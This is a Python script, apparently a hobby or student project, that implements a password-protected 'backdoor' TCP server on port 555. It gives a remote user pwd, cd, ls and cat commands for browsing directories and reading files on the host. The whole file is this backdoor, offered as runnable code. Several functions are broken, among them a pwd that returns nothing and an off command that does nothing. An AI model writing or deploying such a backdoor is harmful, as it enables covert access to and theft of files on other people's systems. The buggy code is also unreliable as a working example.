import socket
import sys
import os

global debugFlag
password = "clean"
currentDir = ""


# Debug function to print out messages while debugging code
def debug(msg):
    if(debugFlag):
        print(msg)

# Starts up the TCP server on the specified port
def server(port):

    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverAddress = ("localhost", port)
    serverSocket.bind(serverAddress)
    debug("Waiting for connection")
    # Listen and wait for a connection
    serverSocket.listen(1)

    while True:
        # Wait for a connection over socket
        (connection, address) = serverSocket.accept()
        debug("Connection accepted from")
        debug(address)
    # Connection should be established if we reach here
        connection.send("Authentication required...".encode())
        # Receive authentication
        while(True):
            request = connection.recv(1024).decode();
            request = request.replace("\n", "")
            if(authenticate(request)):
                backdoor(connection)
            else:
                connection.send("Incorrect password, try again\n".encode());

def authenticate(message):
    if(message == password):
        return True
    elif(message == "off"):
        off()
    else:
        return False


# Once a connection is established, backdoor program
# is launched and commands are interpreted
def backdoor(connection):
    connection.send("Authentication successful, waiting for commands".encode());
    connection.send("--help for command list\n".encode())

    while True:
        # Receive command and interpret accordingly
        request = connection.recv(1024).decode().replace("\n", "")
        dualArg = False
        if(" " in request):
            debug("Dual arguments")
            dualArg = True
        if(dualArg):
            request = request.split(" ")
        debug("Single argument")



        # Base request index 0, args in index 1

        requestSwitch = {
            "pwd" : pwd,
            "cd" : cd,
            "ls" : ls,
            "cat" : cat,
            "help" : help,
            "off" : off
        }
        try:
            if(dualArg):
                connection.send(requestSwitch[request[0]](request[1]).encode())
            else:
                toSend = requestSwitch[request]()
                for i in toSend:
                    i = i + "\n"
                    connection.send(i.encode())
        except KeyError:
            connection.send("Incorrect command, try \"help\"\n".encode())


        # Interpret the request, call corresponding function


# BEGIN BACKDOOR FUNCTIONS

#Returns current directory
def pwd():
    os.getcwd()

# Changes to specified directory
def cd(directory):
    os.chdir(directory)


# Lists contents of current directory
def ls():
    ret = os.listdir(os.getcwd())
    return ret

# Returns contents of given file
def cat(filename):
    with open(filename) as ret:
        return ret.read()

# Prints command list
def help():
    ret = """Since you don't know what you're doing, here's some help
    --------------------------------------------------------
    Command - *Function*
    --------------------------------------------------------
    pwd - Returns current working directory
    cd <directory> - Changes to directory <directory>
    ls - Lists the contents of the current directory
    cat <filename> - Returns contents of <filename>\n\n"""
    return ret

# Shuts down backdoor server
def off():
    print()





debugFlag = True
server(555)